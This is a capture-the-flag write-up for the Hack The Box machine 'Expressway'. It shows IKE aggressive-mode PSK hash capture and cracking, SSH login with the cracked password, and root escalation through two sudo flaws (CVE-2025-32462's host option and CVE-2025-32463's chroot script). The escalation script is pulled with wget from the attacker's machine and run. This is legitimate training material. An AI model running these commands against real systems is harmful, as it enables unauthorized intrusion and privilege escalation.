---
title: Expressway [Easy]
published: false
date: 2025-09-21
tags: [htb, linux, nmap, isakmp, ike-scan, psk-crack, ssh, hashcat, sudo, cve-2025-32463]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/expressway-htb-season9
image: /assets/img/expressway-htb-season9/expressway-htb-season9_banner.png
---

# Expressway HTB Season 9
## Machine information
Author: [dakkmaddy](https://app.hackthebox.com/users/17571)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.228.198
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 22:15 EDT
Nmap scan report for 10.129.228.198
Host is up (0.37s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.96 seconds
```

Just only port `22` so let's check for UDP ports.

```bash
└─$ sudo nmap -sU --top-ports 100 10.129.228.198
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 22:23 EDT
Nmap scan report for 10.129.228.198
Host is up (0.19s latency).
Not shown: 95 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
1028/udp open|filtered ms-lsa
4500/udp open|filtered nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 119.71 seconds
```

Got port `500/udp` running `isakmp` service.

### isakmp
Google and found out definitions about `ISAKMP` or the Internet Security Association and Key Management Protocol, is a framework defined by RFC 2408 that establishes Security Associations (SAs) and manages cryptographic keys for secure network communication. <br>
Searching for some networking pentest and got two articles that we gonna use them to exploit this service: <br>
- [ipsec-ike-vpn-port-500-udp](https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp)
- [ipsec-ike-vpn-pentesting](https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting)

First we will scan for IPsec VPN Services.

```bash
└─$ nmap -sU -p 500 --script ike-version 10.129.228.198
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 22:28 EDT
Nmap scan report for 10.129.228.198
Host is up (0.20s latency).

PORT    STATE SERVICE
500/udp open  isakmp
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0

Nmap done: 1 IP address (1 host up) scanned in 14.31 seconds
```
So we got: <br>
- IKE (Internet Key Exchange) service is active
- XAUTH (Extended Authentication) support - usually uses username/password
- Supports Dead Peer Detection v1.0

Nextup, let's identify VPN Vendor & Configuration.

```bash
└─$ ike-scan -M -A 10.129.228.198
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.228.198  Aggressive Mode Handshake returned
        HDR=(CKY-R=ea7981ac70dceaaa)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.211 seconds (4.75 hosts/sec).  1 returned handshake; 0 returned notify
```

We got the `ike@expressway.htb` and know the domain is `expressway.htb`. <br>
&rarr; Add these to `/etc/hosts`.

```bash
10.129.228.198     expressway.htb
```

Then we extract VPN Group Name & Hash.

```bash
└─$ ike-scan -A --pskcrack 10.129.228.198
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.228.198  Aggressive Mode Handshake returned HDR=(CKY-R=f09aa6d7a7b69bf4) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
244da01cd03dc35175ff9dd71ca4698ece97efd5abb41e4b84d3877f32ba61a96c2bec536fb673dc7fbbf63dbd81df3e8e1e0c546d58cd8c375b14b48417323d099f4157f96ec9233c43b0f8181987503d2341ce1baebe6a9b3ad40fb604de6ecdb63be086f40f0f5ec700e9a45d5bff26c97a0de46d2f0c9c54dca842c26fcc:116d5ce8db42b4e09a98890a23a7a67ddd0f738ea895485f57520aa1561817882c9e084a0ba7151c784da9ed9d5d6269e1aa7f11e10ebea363fa9fb0b86a7476cc79332e457724b90550ed0ea8152536c14d04f90d2ea20a5f937ec91687ed62a04bc71ce04fe9653755b54e9213ec449891598490f4e581f25b775bda4118cf:f09aa6d7a7b69bf4:4684498cf8a2a535:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:6f4adeb686cd93be8a5e9617b3bab84540c16889:650cb254d8c29f4624ee29619dbcddf79d4a82d7e45341c9b11c71e22bc473aa:a4d3a0b34a9dfea1fef8f5025a894894c68e8e71
Ending ike-scan 1.9.6: 1 hosts scanned in 0.199 seconds (5.02 hosts/sec).  1 returned handshake; 0 returned notify
```

Got our hash but this one is `PSK`. <br>
&rarr; Let's use `hashcat` to identify this type of mode and crack it out.

### Password Cracking
```bash
└─$ hashcat --identify '244da01cd03dc35175ff9dd71ca4698ece97efd5abb41e4b84d3877f32ba61a96c2bec536fb673dc7fbbf63dbd81df3e8e1e0c546d58cd8c375b14b48417323d099f4157f96ec9233c43b0f8181987503d2341ce1baebe6a9b3ad40fb604de6ecdb63be086f40f0f5ec700e9a45d5bff26c97a0de46d2f0c9c54dca842c26fcc:116d5ce8db42b4e09a98890a23a7a67ddd0f738ea895485f57520aa1561817882c9e084a0ba7151c784da9ed9d5d6269e1aa7f11e10ebea363fa9fb0b86a7476cc79332e457724b90550ed0ea8152536c14d04f90d2ea20a5f937ec91687ed62a04bc71ce04fe9653755b54e9213ec449891598490f4e581f25b775bda4118cf:f09aa6d7a7b69bf4:4684498cf8a2a535:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:6f4adeb686cd93be8a5e9617b3bab84540c16889:650cb254d8c29f4624ee29619dbcddf79d4a82d7e45341c9b11c71e22bc473aa:a4d3a0b34a9dfea1fef8f5025a894894c68e8e71'
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   5400 | IKE-PSK SHA1                                               | Network Protocol
```

So we got mode `5400` and can crack with it. <br>
Checking about this article and found out [capturing-and-cracking-the-hash](https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting#capturing-and-cracking-the-hash) using `psk-crack` so we go with this one.

```bash
└─$ psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt 
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash a4d3a0b34a9dfea1fef8f5025a894894c68e8e71
Ending psk-crack: 8045040 iterations in 11.123 seconds (723258.17 iterations/sec)
```

Got the password for `ike@expressway.htb`. <br>
&rarr; `freakingrockstarontheroad`.

```bash
└─$ ssh ike@expressway.htb
ike@expressway.htb's password: 
Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep 21 03:42:21 2025 from 10.10.16.5
ike@expressway:~$ ls -la
total 32
drwx------ 4 ike  ike  4096 Sep 16 10:23 .
drwxr-xr-x 3 root root 4096 Aug 14 22:48 ..
lrwxrwxrwx 1 root root    9 Aug 29 14:57 .bash_history -> /dev/null
-rw-r--r-- 1 ike  ike   220 May 18 22:58 .bash_logout
-rw-r--r-- 1 ike  ike  3526 Aug 28 12:49 .bashrc
drwxr-xr-x 3 ike  ike  4096 Aug 28 12:29 .local
-rw-r--r-- 1 ike  ike   807 May 18 22:58 .profile
drwx------ 2 ike  ike  4096 Sep 16 10:21 .ssh
-rw-r----- 1 root ike    33 Sep 21 03:11 user.txt
ike@expressway:~$ cat user.txt
5ce07f6d00c8725155d1fddab722bee6
```

We are in `ike` and nailed the `user.txt` flag.

## Initial Access
Let's doing some recon inside `ike`.

### Discovery
```bash
ike@expressway:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

Password: 
Sorry, user ike may not run sudo on expressway.
```

There is no sudo permissions here. <br>
Let's check if this user belong to other group.

```bash
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

So `ike` also in group `proxy`. Gonna check out files and folder that got permissions from `proxy`.

```bash
ike@expressway:~$ find / -group proxy 2>/dev/null
/run/squid
/var/spool/squid
/var/spool/squid/netdb.state
/var/log/squid
/var/log/squid/cache.log.2.gz
/var/log/squid/access.log.2.gz
/var/log/squid/cache.log.1
/var/log/squid/access.log.1
```

Let's check out `/var/spool/squid`.

```bash
ike@expressway:/var/log/squid$ cat access.log.1
1753229566.990      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229580.379      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229580.417     15 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3944 GET /nmaplowercheck1753229281 - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /flumemaster.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3916 GET /master.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3914 GET /.git/HEAD - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /tasktracker.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3914 GET /rs-status - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://www.google.com/ - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3902 POST /sdk - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 XDGY / - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3916 GET /evox/about - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3906 GET /HNAP1 - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 TCP_DENIED/403 381 HEAD http://www.google.com/ - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3934 GET /browseDirectory.jsp - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3924 GET /jobtracker.jsp - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3916 GET /status.jsp - HIER_NONE/- text/html
1753229689.114      0 192.168.68.50 NONE_NONE/400 3916 GET /robots.txt - HIER_NONE/- text/html
1753229689.114      0 192.168.68.50 NONE_NONE/400 3922 GET /dfshealth.jsp - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3918 GET /favicon.ico - HIER_NONE/- text/html
1753229689.222      0 192.168.68.50 TCP_DENIED/403 3768 CONNECT www.google.com:80 - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 381 HEAD / - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229689.475      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.526      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html
1753229689.629      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.680      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.783      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.933      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229690.086      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229719.140      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229719.245      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229760.700      0 192.168.68.50 NONE_NONE/400 3918 GET /randomfile1 - HIER_NONE/- text/html
1753229760.722      0 192.168.68.50 NONE_NONE/400 3908 GET /frand2 - HIER_NONE/- text/html
```

We found hostname internal `offramp.expressway.htb` blocked by proxy. <br>
&rarr; Let's check out more.

```bash
ike@expressway:/var/log/squid$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

Searching out and found two related cves [CVE-2025-32462](https://nvd.nist.gov/vuln/detail/CVE-2025-32462) [CVE-2025-32463](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). <br>
These two all talk about Sudo chroot Elevation of Privilege which we can check out this blog [vulnerability-alert-CVE-2025-32463-sudo-chroot](https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot).

## Privilege Escalation
```bash
ike@expressway:~$ sudo -h
sudo - execute a command as another user

usage: sudo -h | -K | -k | -V
usage: sudo -v [-ABkNnS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-ABkNnS] [-g group] [-h host] [-p prompt] [-U user]
            [-u user] [command [arg ...]]
usage: sudo [-ABbEHkNnPS] [-C num] [-D directory]
            [-g group] [-h host] [-p prompt] [-R directory] [-T timeout]
            [-u user] [VAR=value] [-i | -s] [command [arg ...]]
usage: sudo -e [-ABkNnS] [-C num] [-D directory]
            [-g group] [-h host] [-p prompt] [-R directory] [-T timeout]
            [-u user] file ...

Options:
  -A, --askpass                 use a helper program for password prompting
  -b, --background              run command in the background
  -B, --bell                    ring bell when prompting
  -C, --close-from=num          close all file descriptors >= num
  -D, --chdir=directory         change the working directory before running
                                command
  -E, --preserve-env            preserve user environment when running command
      --preserve-env=list       preserve specific environment variables
  -e, --edit                    edit files instead of running a command
  -g, --group=group             run command as the specified group name or ID
  -H, --set-home                set HOME variable to target user's home dir
  -h, --help                    display help message and exit
  -h, --host=host               run command on host (if supported by plugin)
  -i, --login                   run login shell as the target user; a command
                                may also be specified
  -K, --remove-timestamp        remove timestamp file completely
  -k, --reset-timestamp         invalidate timestamp file
  -l, --list                    list user's privileges or check a specific
                                command; use twice for longer format
  -n, --non-interactive         non-interactive mode, no prompts are used
  -P, --preserve-groups         preserve group vector instead of setting to
                                target's
  -p, --prompt=prompt           use the specified password prompt
  -R, --chroot=directory        change the root directory before running command
  -S, --stdin                   read password from standard input
  -s, --shell                   run shell as the target user; a command may
                                also be specified
  -T, --command-timeout=timeout terminate command after the specified time limit
  -U, --other-user=user         in list mode, display privileges for user
  -u, --user=user               run command (or edit file) as specified user
                                name or ID
  -V, --version                 display version information and exit
  -v, --validate                update user's timestamp without running a
                                command
  --                            stop processing command line arguments
```

We saw that the `-h` can also be used to run command on host and if we combine with `-i`, we can escalated to `root` via `offramp.expressway.htb`.

### Sudo -h bypass
```bash
ike@expressway:/var/log/squid$ sudo -h offramp.expressway.htb -i
root@expressway:~# id
uid=0(root) gid=0(root) groups=0(root)
root@expressway:~# ls -la
total 44
drwx------  6 root root 4096 Sep 21 03:11 .
drwxr-xr-x 18 root root 4096 Sep 16 16:02 ..
lrwxrwxrwx  1 root root    9 Aug 29 14:57 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwx------  3 root root 4096 Sep 16 16:02 .config
drwx------  3 root root 4096 Sep 16 16:02 .gnupg
-rw-------  1 root root   20 Sep 16 15:51 .lesshst
drwxr-xr-x  3 root root 4096 Sep 16 16:02 .local
lrwxrwxrwx  1 root root    9 Sep 16 10:24 .mariadb_history -> /dev/null
-rw-r--r--  1 root root  132 May 12 20:25 .profile
-rw-r-----  1 root root   33 Sep 21 03:11 root.txt
-rw-r--r--  1 root root   66 May 23 21:49 .selected_editor
drwx------  2 root root 4096 Sep 16 16:02 .ssh
root@expressway:~# cat root.txt
4d8af57d5dbba97bcfaa0d4e5fc5ea78
```

Got `root` and grab the `root.txt` flag.

Alternatively we can clone this script [sudo-chwoot.sh](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/blob/main/sudo-chwoot.sh) and then upload via `wget` from our kali to target machine and run it to get `root` access.

```bash
ike@expressway:/tmp$ wget 10.10.16.5/sudo-chwoot.sh
Prepended http:// to '10.10.16.5/sudo-chwoot.sh'
--2025-09-21 04:05:11--  http://10.10.16.5/sudo-chwoot.sh
Connecting to 10.10.16.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1046 (1.0K) [text/x-sh]
Saving to: ‘sudo-chwoot.sh’

sudo-chwoot.sh                                                                 100%[====================================================================================================================================================================================================>]   1.02K  --.-KB/s    in 0s      

2025-09-21 04:05:12 (59.5 MB/s) - ‘sudo-chwoot.sh’ saved [1046/1046]
```

```bash
ike@expressway:/tmp$ chmod +x sudo-chwoot.sh 
ike@expressway:/tmp$ ./sudo-chwoot.sh id
woot!
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

```bash
ike@expressway:/tmp$ ./sudo-chwoot.sh
woot!
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

Woot! :D

![result](/assets/img/expressway-htb-season9/result.png)